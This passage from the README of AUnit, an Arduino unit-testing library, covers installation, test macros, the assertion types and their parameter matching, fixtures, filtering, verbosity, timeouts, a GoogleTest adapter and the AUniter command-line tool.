itself.\nInstallation\nThe latest stable release is available in the Arduino IDE Library Manager. Search for \"unit test\" or \"AUnit\", select \"AUnit\", then click the \"Install\" button.\nThe development version can be installed by cloning the GitHub repository, checking out the develop branch, then manually copying over the contents to the ./libraries directory used by the Arduino IDE. (The result is a directory named ./libraries/AUnit.) See the Preferences menu for the location of the Arduino sketch directory. The master branch contains the stable release.\nUsing either installation method, you may need to restart the Arduino IDE to pick up the new library.\nSource Code\nThe source files are organized as follows:\nsrc/AUnit.h - main header file\nsrc/AUnitVerbose.h - verbose version of main header file\nsrc/aunit/ - all implementation files\ntests/ - unit tests written using AUnit itself\nexamples/ - example sketches\nDocumentation\nREADME.md - this file\nDoxygen docs published on GitHub Pages can help navigate the classes and header files\nExamples\nThe examples/ directory has a number of examples:\nadvanced - how to subclass Test and TestOnce manually\nbasic - using the test() macro\ncontinuous - using the testing() macro\nfilter - how to filter tests using TestRunner::include() and TestRunner::exclude()\nfixture - how to use the testF() macro with test fixtures\nmeta_asserts - how to use assertTestXxx() and checkTestXxx()\nIn the tests/ directory:\nAUnitTest - the unit test for core AUnit functions,\nAUnitMetaTest - the unit test for meta assertions and extern*() macros\nFilterTest - manual tests for include() and exclude() filters\nSetupAndTeardownTest - tests to verify that setup() and teardown() are called properly by the finite state machine\nPerhaps the best way to see AUnit in action through real life examples. I currently have 3 Arduino project using AUnit extensively (look under the tests/ directory in each project).\nAceButton\nOriginally created using ArduinoUnit 2.2, and I have kept those tests backwards compatible. They do not use the new features of AUnit.\nAceRoutine\nDemonstrates the full power of AUnit better.\nAceTime\nDemonstrates the full power of AUnit better.\nUsage\nIn this section, information about differences between AUnit and ArduinoUnit will appear in a note marked by ArduinoUnit Compatibility.\nHeader and Namespace\nTo prevent name clashes with other libraries and code, all classes in the AUnit library are defined in the aunit namespace. The user will mostly interact with the TestRunner class. It can be referenced with an explicit namespace qualifier (i.e. aunit::TestRunner), or we can use a using directive like this:\n#include <AUnit.h>\nusing aunit::TestRunner;\nor we can import the entire aunit namespace:\n#include <AUnit.h>\nusing namespace aunit;\nSimilar to ArduinoUnit, many of the \"functions\" in this framework (e.g. test(), testing(), assertXxx()) are defined as #define macros which live in the global namespace, so it is usually not necessary to import the entire aunit namespace.\nVerbose Mode\nBy default, AUnit generates terse assertion messages by leaving out the string arguments of the various assertXxx() macros. If you would like to get the same verbose output as ArduinoUnit, use the following header instead:\n#include <AUnitVerbose.h>\nThe flash memory consumption on an 8-bit AVR may go up by 20-25% for medium to large tests. On Teensy ARM, ESP8266 or ESP32, the increased memory size probably does not matter too much because these microcontrollers have far more flash and static memory.\nDefining the Tests\nThe usage of AUnit is basically identical to ArduinoUnit. The following macros are used to create a test:\ntest(name) {...} - creates a subclass of TestOnce\ntesting(name) {...} - creates a subclass of TestAgain\ntest(suiteName, name) {...} - creates a subclass of TestOnce\ntesting(suiteName, name) {...} - creates a subclass of TestAgain\ntestF(classname, name) {...} - creates a subclass of classname\ntestingF(classname, name) {...} - creates a subclass of classname\nThe code in { } following these macros becomes the body of a method in a subclass derived from the base class indicated above. The test() and testF() macros place the code body into the TestOnce::once() method. The testing() and testingF() macros place the code body into the TestAgain::again() method.\nThe test() and testing() macros support 1 or 2 arguments. The one-argument version is inherited from ArduinoUnit. The two-argument version is analogous to the TEST() macro in GoogleTest, where the suiteName can be used to organize multiple tests into a collection of similar tests. The grouping is purely in the naming scheme of the generated code, there is no functional relationship between these tests.\nDuring static initialization, the constructor of the object adds itself to an internal list. The root of that list is given by Test::getRoot(). The TestRunner::run() method traverses the linked list, executing each test case until it passes, fails or is skipped.\nHere is a rough outline of an AUnit unit test sketch:\n#line 2 AUnitTest.ino\n#include <AUnit.h>\nusing namespace aunit;\ntest(example) {\n...\nassertXxx(...)\n...\n}\ntest(ExampleTest, example) {\n...\n}\ntesting(looping) {\n...code...\nif (...) {\npass();\n} else if (...) {\nfailTestNow();\n} else {\nskipTestNow();\n}\n}\ntesting(LoopingTest, looping) {\n...\n}\nclass CustomTestOnce: public TestOnce {\nprotected:\n// optional\nvoid setup() override {\nTestOnce::setup();\n...setup code...\n}\n// optional\nvoid teardown() override {\n...teardown code...\nTestOnce::teardown();\n}\nvoid assertBigStuff() {\n...higher level assertions...\n}\n};\ntestF(CustomTestOnce, example_test) {\n...\nassertBigStuff();\n...\n}\nclass CustomTestAgain: public TestAgain {\nprotected:\n// optional\nvoid setup() override {\nTestAgain::setup();\n...setup code...\n}\n// optional\nvoid teardown() override {\n...teardown code...\nTestAgain::teardown();\n}\nvoid assertBigStuff() {\n...various assertions...\n}\n};\ntestingF(CustomTestAgain, example_test) {\n...\nassertBigStuff();\n...\n}\nvoid setup() {\nSerial.begin(115200);\nwhile (! Serial); // Wait until Serial is ready - Leonardo/Micro\nTestRunner::exclude(\"*\");\nTestRunner::include(\"looping*\");\nTestRunner::include(\"CustomTestAgain\", \"example*\");\n}\nvoid loop() {\nTestRunner::run();\n}\nArduinoUnit Compatibility: The basic structure of the unit test is identical to ArduinoUnit. AUnit adds the testF() and testingF() macros, and the two-argument versions of test() and testing() which are not available in ArduinoUnit. The Test class in ArduinoUnit has been replaced with the TestAgain class in AUnit.\nGenerated Class and Instance Names\nThe arguments to the various test*() macros are used to generate the name for the subclasses of TestOnce or TestAgain, and generate the names of the instances of those classes. For reference, here are the rules:\ntest(name)\nclass: \"test_\" + name\ninstance: \"test_\" + name + \"_instance\"\ntesting(name)\nclass: \"test_\" + name\ninstance: \"test_\" + name + \"_instance\"\ntest(suiteName, name)\nclass: suiteName + \"_\" + name\ninstance: suiteName + \"_\" + name + \"_instance\"\ntesting(suiteName, name)\nclass: suiteName + \"_\" + name\ninstance: suiteName + \"_\" + name + \"_instance\"\ntestF(className, name)\nclass: className + \"_\" + name\ninstance: className + \"_\" + name + \"_instance\"\ntestingF(className, name)\nclass: className + \"_\" + name\ninstance: className + \"_\" + name + \"_instance\"\nThe instance name is available within the test code using the Test::getName() method.\nBinary Assertions\nInside the test() and testing() macros, the following assertions are available. These are essentially identical to ArduinoUnit:\nassertEqual(a, b)\nassertNotEqual(a, b)\nassertLess(a, b)\nassertMore(a, b)\nassertLessOrEqual(a, b)\nassertMoreOrEqual(a, b)\nSupported Parameter Types\nThe 6 core assert macros (assertEqual(), assertNotEqual(), assertLess(), assertMore(), assertLessOrEqual(), assertMoreOrEqual()) support the following 18 combinations for their parameter types:\n(bool, bool)\n(char, char)\n(int, int)\n(unsigned int, unsigned int)\n(long, long)\n(unsigned long, unsigned long)\n(long long, long long)\n(unsigned long long, unsigned long long)\n(double, double)\n(const char *, const char *)\n(const char *, const String&)\n(const char *, const __FlashStringHelper*)\n(const String&, const char*)\n(const String&, const String&)\n(const String&, const __FlashStringHelper*)\n(const __FlashStringHelper*, const char*)\n(const __FlashStringHelper*, const String&)\n(const __FlashStringHelper*, const __FlashStringHelper*)\nThe assertEqual() and assertNotEqual() support arbitary pointer types through implicit casts to const void*:\n(const void*, const void*) (since v1.4)\nAll 9 combinations of the 3 string types (char*, String, and __FlashStringHelper*) are supported.\nThese macros perform deep comparisons for string types instead of just comparing their pointer values. This is different than the ASSERT_EQ() and ASSERT_NE() macros in Google Test which perform only pointer comparisons. In other words, assertEqual() with string types is equivalent to ASSERT_STREQ() in Google Test.\nAlso for string types, these macros support nullptr (unlike the underlying strcmp() function from the C-library). The nullptr string is defined to be \"smaller\" than any non-null string, including the empty string. Two nullptr strings are considered to be equal however.\nAdditionally, the usual C++ implicit type conversion and function overloading matching algorithms apply to support additional argument types. For example, the following type conversions will occur:\nsigned char -> int\nunsigned char -> int\nshort -> int\nunsigned short -> int or unsigned int (depending on sizeof(int))\nchar* -> const char*.\nchar[N] -> const char*\nfloat -> double\npointer types -> const void*\nNote that char, signed char, and unsigned char are 3 distinct types in C++, so a (char, char) will match exactly to one of the assertXxx() methods.\nArduinoUnit Compatibility: The names of the macros are identical. However, the type inference logic of two (a, b) arguments in the assertXxx(a, b) is slightly different. ArduinoUnit allows the two parameters to be slightly different types, at the expense of a compiler warning. In AUnit, the warning becomes a compiler error. See the \"Parameters Must Match Types\" section below.\nParameter Types Must Match\nIn ArduinoUnit, the assertXxx() macros could be slightly different types, for example:\nunsigned int uintValue = 5;\nassertEqual(5, uintValue);\nIf the compiler warnings are enabled in the Preferences box of the IDE, a warning from the compiler is printed:\n../ArduinoUnit/src/ArduinoUnitUtility/Compare.h:17:28: warning:\ncomparison between signed and unsigned integer expressions [-Wsign-compare]\nreturn (!(a<b)) && (!(b<a));\nIn AUnit, the above code produces a compiler error (not a warning) like this:\n.../AUnit/src/aunit/Assertion.h:29:66: error: call of overloaded\n'assertion(const char [14], int, int, const char[3], <unresolved overloaded\nfunction type>, unsigned int&)' is ambiguous\nif (!aunit::assertion(__FILE__,__LINE__,(arg1),opName,op,(arg2)))\\\n...\nThe compiler cannot find an appropriate overloaded version of assertEqual().\nThe solution is to make the parameters the same type:\nassertEqual(5U, uintValue);\nOn the AVR platform, both a (short) and (int) are 16-bit types, so the following will produce a compiler error:\nunsigned short ushortValue = 5;\nassertEqual(5U, ushortValue);\nBut on Teensy-ARM, ESP8266, and ESP32, a 16-bit (short) can be promoted to a 32-bit (int) without loss of precision, so the above will compile just fine. For portability, the following should be used on all platforms:\nunsigned short ushortValue = 5;\nassertEqual((unsigned short) 5, ushortValue);\nThe integer type promotion rules and function overload matching rules can be difficult to remember (and sometimes difficult to understand). The best way to avoid these compiler errors is to make sure that the assertion parameter types are identical, potentially using explicit casting.\nPointer Comparisons\nVersion 1.4 adds pointer comparison to assertEqual() and assertNotEqual(). Arbritary pointers are implicitly cast to a const void* and compared to each other. If the assertion fails, the pointer is converted to an integer type, and the hexadecimal value of the pointer is printed. For example,\ntest(voidPointer) {\nconst int aa[] = {1, 2};\nconst long bb[] = {1, 2};\nassertEqual(aa, bb);\n}\nThis test will fail with the following error message:\nAssertion failed: (aa=0x3FFFFF38) == (bb=0x3FFFFF30), file AUnitTest.ino, line 338.\nTest voidPointer failed.\nComparison against the nullptr will work:\ntest(nullPointer) {\nconst int aa[] = {1, 2};\nassertEqual(aa, nullptr);\n}\nThis will print the following:\nAssertion failed: (aa=0x3FFFFF58) == (nullptr=0x0), file AUnitTest.ino, line 348.\nTest nullPointer failed.\nComparing a string type (i.e. const char*, or const __FlashStringHelper*) to a nullptr will cause an error due to ambiguous matches on overloaded functions. The solution is to explicitly cast the nullptr to the corresponding string type:\ntest(stringPointer) {\nconst char aa[] = \"abc\";\n// assertEqual(aa, nullptr); // Causes errors\nassertEqual(aa, (const char*) nullptr); // Works.\n}\nCase Insensitive String Comparisons\nTwo macros provide case-insensitive string comparisons (analogous to ASSERT_STRCASEEQ() and ASSERT_STRCASENE() in Google Test):\nassertStringCaseEqual(a, b)\nassertStringCaseNotEqual(a, b)\nThe supported types for (a, b) are all 9 combinations of Arduino string types:\n(const char *, const char *)\n(const char *, const String&)\n(const char *, const __FlashStringHelper*)\n(const String&, const char*)\n(const String&, const String&)\n(const String&, const __FlashStringHelper*)\n(const __FlashStringHelper*, const char*)\n(const __FlashStringHelper*, const String&)\n(const __FlashStringHelper*, const __FlashStringHelper*)\nArduinoUnit Compatibility: Not available in ArduinoUnit.\nApproximate Comparisons\nFloating point values are difficult to compare because of internal rounding errors. Google Test provides two types of macros to handle floating points:\nASSERT_FLOAT_EQ(a, b), ASSERT_DOUBLE_EQ(a, b) - determine if the floating point numbers are within 4 Units in the Last Place (ULPs)\nASSERT_NEAR(a, b, error) - determine if the absolute distance between a and b is within the given error\nSince floating point operations are relatively rare in Arduino programming, AUnit offers only the equivalent of ASSERT_NEAR() function:\nassertNear(a, b, error)\nassertNotNear(a, b, error)\nUpon failure, the error messages will look something like:\nAssertion failed: |(1.00) - (1.10)| > (0.20), file AUnitTest.ino, line 517.\nAssertion failed: |(4.00) - (1.10)| <= (0.20), file AUnitTest.ino, line 527.\nUnlike Google Test where ASSERT_NEAR() supports only the double type, both assertNear() and assertNotNear() support integral types as well. The full list of supported types is:\nint\nunsigned int\nlong\nunsigned long\ndouble\nOther primitive types (e.g. char or float) will be automatically converted to one of these supported types by the compiler. (64-bit integer types long long and unsigned long long are not supported here.)\nNote that the abs() of 2 values of a signed integer type can be larger than the maximum value that can be represented by the given signed type. Since signed integer overflow is an undefined behavior in C and C++11, I cannot predict what the compiler will do in that case. Unsigned types should not have this problem because the distance between two values of an unsigned type should always fit inside the given unsigned type. Technically, a similar problem exists for the floating point types (which are naturally signed), but it is unlikely that you are dealing with floating point values so close to the maximum values.\nBoolean Assertions\nThe following boolean asserts are also available:\nassertTrue(condition)\nassertFalse(condition)\nArduinoUnit Compatibility: These are identical to ArduinoUnit.\nTest Fixtures\nWhen the unit tests become more complex, using test fixtures will allow you to place common data objects and methods into a class that can be shared among multiple test cases. This concept matches very closely to the test fixtures in Google Test.\nTo create a test fixture:\nDerives a new class from either TestOnce (if you want to run the test just once), or TestAgain (if you want to run the test repeatedly).\nAdd any data objects inside the class.\nOptionally add a virtual void setup() {...} method to perform any common initialization code. Be sure to call the parent's setup() method in the first line to chain any setup() methods defined by the parents. There may be multiple parent classes.\nOptionally add a virtual void teardown() {...} method to perform any common clean up code. Be sure to call the parent's teardown() method in the last line to chain any teardown() methods defined by the parents. There may be multiple parent classes.\nAdd any additional shared methods into this new class.\nTo define your tests, use the testF() macro like this:\nclass CustomTestOnce: public TestOnce {\nprotected:\n// optional\nvoid setup() override {\nTestOnce::setup();\n...setup code...\n}\n// optional\nvoid teardown() override {\n...teardown code...\nTestOnce::teardown();\n}\nvoid assertCustomStuff() {\n...common code...\n}\nint sharedValue;\n};\ntestF(CustomTestOnce, calculate) {\n...test code here...\n}\nNo constructor for CustomTestOnce needs to be defined.\nUnderneath the covers, the testF() macro creates a subclass named CustomTestOnce_calculate which inherits from TestOnce class. The test code becomes the body of the CustomTestOnce_calculate::once() method. The name of this test has the class name prepended, so it is CustomTestOnce_calculate, which prevents name collision with other testF() tests with the same name using a different test fixture class.\nTo define a continuous test, use the testingF() macro like this:\nclass CustomTestAgain: public TestAgain {\nprotected:\n// optional\nvoid setup() override {\nTestAgain::setup();\n...setup code...\n}\n// optional\nvoid teardown() override {\n...teardown code...\nTestAgain::teardown();\n}\nvoid assertCustomStuff() {\n...common code...\n}\nint sharedValue;\n};\ntestingF(CustomTestAgain, calculate) {\n...test code here...\n}\nSimilarly, the testingF() macro creates a subclass named CustomTestAgain_calculate, and the test code becomes the body of the CustomTestAgain_calculate::again() method.\nSee examples/fixtures/fixtures.ino to see a working example of the testF() macro.\nArduinoUnit Compatibility: The testF() and testingF() macros, and the teardown() virtual method are available only in AUnit (and Google Test), not ArduinoUnit.\nEarly Return and Delayed Assertions\nAUnit (like ArduinoUnit and Google Test) does not use C++ exceptions. Instead, the various assertXxx() macros perform an early return if the condition evaluates to false. That means that the assertions can only bail out of the current method, not the calling method. If you are using test fixtures, and create a shared custom assert function, e.g. the assertCustomStuff() method above, any assertXxx() statements in shared method will bail out of that method only. The statement after the assertCustomStuff() will continue to execute.\nIn other words, in the following example, if the assertCustomStuff() fails, then assertMoreStuff() inside testF() will execute:\nclass CustomTestOnce: public TestOnce {\nprotected:\nvoid assertCustomStuff() {\nassertEqual(sharedValue, 3);\n// This will not execute if the assertEqual() above fails.\nassertLess(...);\n}\nvoid assertMoreStuff() {\nassertEqual(...);\n}\nint sharedValue;\n};\n// DON'T DO THIS\ntestF(CustomTestOnce, dontDoThis) {\nassertCustomStuff();\n// This will execute even if assertCustomStuff() fails.\nassertMoreStuff();\n}\n// DO THIS INSTEAD\ntestF(CustomTestOnce, doThis) {\nassertNoFatalFailure(assertCustomStuff());\nassertNoFatalFailure(assertMoreStuff());\n}\nThe solution is to use the assertNoFatalFailure(statement) macro which checks whether the inner statement returned with a fatal assertion. If so, then it returns immediately, preventing execution from continuing to the code that follows. This macro is modeled after the ASSERT_NO_FATAL_FAILURE(statement) macro in Google Test that provides the same functionality.\nMeta Assertions\nThe following methods from ArduinoUnit have also been implemented:\ncheckTestDone(name)\ncheckTestNotDone(name)\ncheckTestPass(name)\ncheckTestNotPass(name)\ncheckTestFail(name)\ncheckTestNotFail(name)\ncheckTestSkip(name)\ncheckTestNotSkip(name)\ncheckTestExpire(name) [*]\ncheckTestNotExpire(name) [*]\nassertTestDone(name)\nassertTestNotDone(name)\nassertTestPass(name)\nassertTestNotPass(name)\nassertTestFail(name)\nassertTestNotFail(name)\nassertTestSkip(name)\nassertTestNotSkip(name)\nassertTestExpire(name) [*]\nassertTestNotExpire(name) [*]\nThe checkTestXxx() methods check the status of the test named name and returns a bool. The execution continues even if false.\nThe assertTestXxx() methods stops the unit test if the status check returns false, and prints assertion messages that look like this:\nAssertion passed: Test slow_pass is done, file AUnitTest.ino, line 366.\nAssertion passed: Test slow_pass is not failed, file AUnitTest.ino, line 372.\nAssertion passed: Test slow_skip is skipped, file AUnitTest.ino, line 448.\nAssertion passed: Test slow_skip is not timed out, file AUnitTest.ino, line 451.\n(The human readable version of being expired will always be timed out or not timed out on the Serial output.)\nThe following macros define extern references to test case objects which live in other .cpp files. These are required for the above meta assertions if the test cases are defined in another file:\nexternTest()\nexternTesting()\nexternTestF()\nexternTestingF()\nArduinoUnit Compatibility: The methods marked by [*] are only available in AUnit. Also, the assertion messages are different. ArduinoUnit reuses the format used by the assertXxx() macros, so prints something like the following:\nAssertion passed: (test_slow_skip_instance.state=2) >= (Test::DONE_SKIP=2), file\nAUnitTest.ino, line 439.\nAUnit has a separate message handler to print a customized message for the assertTestXxx() meta assertion macros.\nUnconditional Termination\nThe following macros can be used inside the body of test() or testing() macro to terminate a test unconditionally. Each macro prints a short message, and returns immediately from the test, much like an assertXxx() macro that fails.\npassTestNow() [*]\nfailTestNow() [*]\nskipTestNow() [*]\nexpireTestNow() [*]\nThe messages look like:\nStatus passed, file AUnitTest.ino, line 360.\nStatus failed, file AUnitTest.ino, line 378.\nStatus skipped, file AUnitTest.ino, line 380.\nStatus timed out, file AUnitTest.ino, line 391.\nThe following methods on the Test class also set the status of the test, but these methods do not print any messages (which makes debugging difficult) and they do not terminate the test immediately.\npass() - test passed\nfail() - test failed\nskip() - test skipped\nexpire() - test timed out [*]\nIn most cases, the failTestNow(), skipTestNow() and expireTestNow() macros are more useful than the equivalent methods in the Test class. However, in a testing() loop test, the pass() method is probably better than the passTestNow() macro because we usually don't want to see an error message from a passing test.\nArduinoUnit Compatibility: The method(s) marked by [*] are only available in AUnit.\nOverridable Methods\nThe following methods are defined at the Test base class level:\nsetup()\nteardown()\nThe TestOnce class defines:\nonce()\nThe TestAgain class defines:\nagain()\nArduinoUnit Compatibility: These are functionally the same as ArduinoUnit except with different class names. Instead of Test use TestAgain. Instead of Test::loop use TestAgain::again(). ArduinoUnit does not support a teardown() method.\nRunning the Tests\nWe run the test cases in the global loop() method by calling TestRunner::run(). The tests are sorted according to the name of the test given in the argument in the test() or testing() macro.\nEach call to the run() method causes one test case to run and be resolved. The next call to run() executes the next test case. This design allows the loop() method to perform a small amount of work and return periodically to allow the system to perform some actions. On some systems, such as the ESP8266, an error is generated if loop() takes too much CPU time.\n...\nvoid loop() {\nTestRunner::run();\n}\nArduinoUnit Compatibility: This is equivalent to called Test::run() in ArduinoUnit. AUnit sorts the tests in the same way as ArduinoUnit. In ArduinoUnit, each call to Test::run() will process the entire list of currently active test cases. In AUnit, each call to TestRunner::run() performs only a single test case, then returns.\nFiltering Test Cases\nSix filtering methods are available on the TestRunner class:\nTestRunner::include(pattern) - prefix match\nTestRunner::include(testClass, pattern) - prefix match\nTestRunner::exclude(pattern) - prefix match\nTestRunner::exclude(testClass, pattern) - prefix match\nTestRunner::includesub(substring) - substring match (v1.6)\nTestRunner::excludesub(substring) - substring match (v1.6)\nThese methods are called from the global setup() method, for example:\nvoid setup() {\nTestRunner::include(\"looping*\");\nTestRunner::exclude(\"CustomTestAgain\", \"*\");\nTestRunner::include(\"CustomTestAgain\", \"test*\");\nTestRunner::include(\"CustomTestAgain\", \"test*\");\nTestRunner::includesub(\"net\");\nTestRunner::excludesub(\"net\");\n...\n}\nExcluded tests bypass their Test::setup() and Test::teardown() methods and terminate immediately. For the purposes of reporting, excluded tests are counted as \"skipped\".\nThe 2-argument versions of include() and exclude() correspond to the 2 arguments of testF() and testingF().\nThe filtering methods are also available as command line flags and arguments (--include, --exclude, --includesub --excludesub) if the test program is compiled using EpoxyDuino under a Unix-like environment. See the EpoxyDuino section below.\nImplicit Exclude All: If the first filtering request is an \"include\" (i.e. include(pattern), include(testClass, pattern), includesub(substring)), all tests are excluded by default initially, instead of being included by default. Otherwise, the first \"include\" statement would have no effect.\nArduinoUnit Compatibility: The equivalent versions in ArduinoUnit are Test::exclude() and Test::include() The matching algorithm in AUnit is not as powerful as the one in ArduinoUnit. AUnit supports only a single wildcard character * and that character can appear only at the end if it is present. For example, the following are accepted:\nTestRunner::exclude(\"*\");\nTestRunner::include(\"f*\");\nTestRunner::exclude(\"flash_*\");\nTestRunner::include(\"looping*\");\nTestRunner::include(\"CustomTestOnce\", \"flashTest*\");\nAUnit provides 2-argument versions of include() and exclude()\nOutput Printer\nThe default output printer is the Serial instance. This can be changed using the TestRunner::setPrinter() method:\n#include <AUnit.h>\nusing aunit::TestRunner;\n...\nvoid setup() {\nSerial1.begin(...);\nTestRunner::setPrinter(&Serial1);\n...\n}\nvoid loop() {\nTestRunner::run();\n}\nArduinoUnit Compatibility: This is the equivalent of the Test::out static member variable in ArduinoUnit.\nControlling the Verbosity\nThe default verbosity of the test results can be controlled using the TestRunner::setVerbosity() method:\n#include <AUnit.h>\nusing aunit::TestRunner;\nusing aunit::Verbosity;\n...\nvoid setup() {\n...\nTestRunner::setVerbosity(Verbosity::kAll);\n...\n}\nEvery test is assigned this default verbosity just before its Test::setup() is called. A unit test can choose to modify the verbosity calling one of the following methods:\nvoid enableVerbosity(uint8_t verbosity);\nenables the given verbosity, retaining all the others\nvoid disableVerbosity(uint8_t verbosity);\ndisables the given verbosity, retaining all the others\nat the beginning of the test definition, like this:\ntest(enable_assertion_passed_messages) {\nenableVerbosity(Verbosity::kAssertionPassed);\n...\n}\nThe values of verbosity are defined by the static constants of the Verbosity utility class:\nVerbosity::kAssertionPassed\nVerbosity::kAssertionFailed\nVerbosity::kTestPassed\nVerbosity::kTestFailed\nVerbosity::kTestSkipped\nVerbosity::kTestExpired\nVerbosity::kTestRunSummary\nVerbosity::kAssertionAll - enables all assert messages\nVerbosity::kTestAll\nsame as (kTestPassed | kTestFailed | kTestSkipped | kTestExpired)\nVerbosity::kDefault\nsame as (kAssertionFailed | kTestAll | kTestRunSummary )\nVerbosity::kAll - enables all messages\nVerbosity::kNone - disables all messages\nArduinoUnit Compatibility: The following ArduinoUnit variables do not exist:\nTest::min_verbosity\nTest::max_verbosity\nThe bit field constants have slightly different names:\nTEST_VERBOSITY_TESTS_SUMMARY -> Verbosity::kTestRunSummary\nTEST_VERBOSITY_TESTS_FAILED -> Verbosity::kTestFailed\nTEST_VERBOSITY_TESTS_PASSED -> Verbosity::kTestPassed\nTEST_VERBOSITY_TESTS_SKIPPED -> Verbosity::kTestSkipped\nTEST_VERBOSITY_TESTS_ALL -> Verbosity::kTestAll\nTEST_VERBOSITY_ASSERTIONS_FAILED -> Verbosity::kAssertionFailed\nTEST_VERBOSITY_ASSERTIONS_PASSED -> Verbosity::kAssertionPassed\nTEST_VERBOSITY_ASSERTIONS_ALL -> Verbosity::kAssertionAll\nTEST_VERBOSITY_ALL -> Verbosity::kAll\nTEST_VERBOSITY_NONE -> Verbosity::kNone\n{no equivalent} <- Verbosity::kDefault\n{no equivalent} <- Verbosity::kTestExpired\nLine Number Mismatch\nAUnit suffers from the same compiler/preprocessor bug as ArduinoUnit that causes the built-in __LINE__ macro to be off by one. The solution is to add:\n#line 2 {file.ino}\nas the first line of a unit test sketch.\nArduinoUnit Compatibility: This problem is identical to ArduinoUnit.\nTest Framework Messages\nAssertion Message\nThe various assertXxx() macros in AUnit print a message upon pass or fail. For example, if the assertion was:\nint expected = 3;\nint counter = 4;\nassertEquals(expected, counter);\nThe error message (if enabled, which is the default) is:\nAssertion failed: (3) == (4), file AUnitTest.ino, line 134.\nAsserts with bool values produce customized messages, printing \"true\" or \"false\" instead of using the Print class default conversion to int:\nassertEquals(true, false);\nAssertion failed: (true) == (false), file AUnitTest.ino, line 134.\nSimilarly, the assertTrue() and assertFalse() macros provide more customized messages:\nbool ok = false;\nassertTrue(ok);\nAssertion failed: (false) is true, file AUnitTest.ino, line 134.\nand\nbool ok = true;\nassertFalse(ok);\nAssertion failed: (true) is false, file AUnitTest.ino, line 134.\nArduinoUnit Compatibility: ArduinoUnit captures the arguments of the assertEqual() macro and prints:\nAssertion failed: (expected=3) == (counter=4), file AUnitTest.ino, line 134.\nEach capture of the parameter string consumes flash memory space. If the unit test has numerous assertXxx() statements, the flash memory cost is expensive. AUnit omits the parameters to reduce flash memory space by about 33%.\nThe messages for asserts with bool values are customized for better clarity (partially to compensate for the lack of capture of the string of the actual arguments, and are different from ArduinoUnit.\nVerbose Mode Message\nIf you use the verbose header:\n#include <AUnitVerbose.h>\nthe assertion message will contain the string fragments of the arguments passed into the assertXxx() macros, like this:\nAssertion failed: (expected=3) == (counter=4), file AUnitTest.ino, line 134.\nAssertion failed: (ok=false) is true, file AUnitTest.ino, line 134.\nArduinoUnit Compatibility: The verbose mode produces the same messages as ArduinoUnit, at the cost of increased flash memory usage.\nTest Case Summary\nAs each test case finishes, the TestRunner prints out the summary of the test case like this:\nTest bad failed.\nTest looping_pass passed.\nTest looping_skip skipped.\nTest looping_until timed out.\nArduinoUnit Compatibility: These are identifcal to ArduinoUnit, except that the \"timed out\" status is new to AUnit. See Test Timeout section below.\nTest Runner Summary\nAt the end of the test run, the TestRunner prints out the summary of all test cases, like this:\nTestRunner duration: 0.05 seconds.\nTestRunner summary: 12 passed, 0 failed, 2 skipped, 1 timed out, out of 15 test(s).\nArduinoUnit Compatibility: The message format is slightly different than ArduinoUnit. I changed \"Test summary\" to \"TestRunner summary\" because the former looks identical to the message that could have been printed by a test(summary) test case. AUnit also adds information about tests which timed out. See below.\nTest Timeout\nArduinoUnit Compatibility: Only available in AUnit.\nFrom my experience, it seems incredibly easy to write a testing() test case which accidentally runs forever because the code forgets to call an explicit pass(), fail() or skip().\nThe TestRunner in AUnit applies a timeout value to all the test cases that it runs. The default timeout is 10 seconds. A timeout value of 0 means an infinite timeout, which means that the testing() test case may run forever. The value of the timeout is stored as a uint16_t type, so the maximum timeout is 65535 seconds or a bit over 18 hours.\nCurrently, the timeout value is global to all test cases. Time out values for individual tests cannot be set independently. If a test does not finish before that time, then the test is marked as timed out (internally implemented by the Test::expire() method) and a message is printed like this:\nTest looping_until timed out.\nThe timeout value can be changed by calling the static TestRunner::setTimeout() method. Here is an example that sets the timeout to 30 seconds instead:\nvoid setup() {\n...\nTestRunner::setTimeout(30);\n...\n}\nArduinoUnit Compatibility: Only available in AUnit.\nGoogleTest Adapter\nIt may be possible to run simple unit tests written using Google Test API on an Arduino platform by using the aunit/contrib/gtest.h adapter. This adapter layer provides a number of Google Test macros which map to their equivalent macros in AUnit:\nASSERT_EQ(e, a) - assertEqual()\nASSERT_NE(e, a) - assertNotEqual()\nASSERT_LT(e, a) - assertLess()\nASSERT_GT(e, a) - assertMore()\nASSERT_LE(e, a) - assertLessOrEqual()\nASSERT_GE(e, a) - assertMoreOrEqual()\nASSERT_STREQ(e, a) - assertEqual()\nASSERT_STRNE(e, a) - assertNotEqual()\nASSERT_STRCASEEQ(e, a) - assertStringCaseEqual()\nASSERT_STRCASENE(e, a) - assertStringCaseNotEqual()\nASSERT_TRUE(x) - assertTrue()\nASSERT_FALSE(x) - assertFalse()\nASSERT_NEAR(e, a, error) - assertNear()\nTo use the gtest.h adapter, include the following headers:\n#include <AUnit.h>\n#include <aunit/contrib/gtest.h>\nor\n#include <AUnitVerbose.h>\n#include <aunit/contrib/gtest.h>\nCommand Line Tools\nEach unit test is an independent *.ino program. You can run it using your Arduino IDE. But there are 2 command line tools that can be used to run them.\nAUniter\nThe auniter.sh script used to be part of this project, but now lives in its own AUniter (https://github.com/bxparks/AUniter) project. The auniter.sh script is a wrapper around:\nArduino IDE in command line mode, and\nArduino CLI tool\nUsing auniter.sh, you can compile, upload and validate multiple AUnit tests on multiple Arduino boards using a single command.\nThe script can monitor the serial port and determine if the unit test passed or failed, and it will print out a summary of all unit tests at the end. Full details are given in the AUniter project, but here are some quick examples copied from the AUniter/README.md file:\n$ auniter envs\nlist the environments configured in the auniter.ini config file\n$ auniter ports\nlist the available serial ports and devices\n$ auniter verify nano Blink.ino\nverify (compile) Blink.ino using the env:nano environment\n$ auniter verify nano,esp8266,esp32 Blink.ino\nverify Blink.ino on 3 target environments (env:nano, env:esp8266, env:esp32)\n$ auniter upload nano:/dev/ttyUSB0 Blink.ino\nupload Blink.ino to the env:nano target environment connected to /dev/ttyUSB0\n$ auniter test nano:USB0 BlinkTest.ino\ncompile and upload BlinkTest.ino using the env:nano environment, upload it to the board at /dev/ttyUSB0, then validate the output of the AUnit unit test\n$ auniter test nano:USB0,esp8266:USB1,esp32:USB2 BlinkTest/ ClockTest/\nupload and verify the 2 unit tests (BlinkTest/BlinkTest.ino, ClockTest/ClockTest.ino) on 3 target environments (env:nano, env:esp8266, env:esp32) located at the 3 respective ports (/dev/ttyUSB0, /dev/ttyUSB1, /dev/ttyUSB2)\n$ auniter upmon nano:USB0 Blink.ino\nupload the Blink.ino sketch and monitor the serial port using a user-configurable terminal program (e.g. picocom) on /dev/ttyUSB0\nEpoxyDuino\nInstead of running the unit tests on the actual microcontrollers themselves, you can compile and execute AUnit unit tests natively on Linux or MacOS machines using the 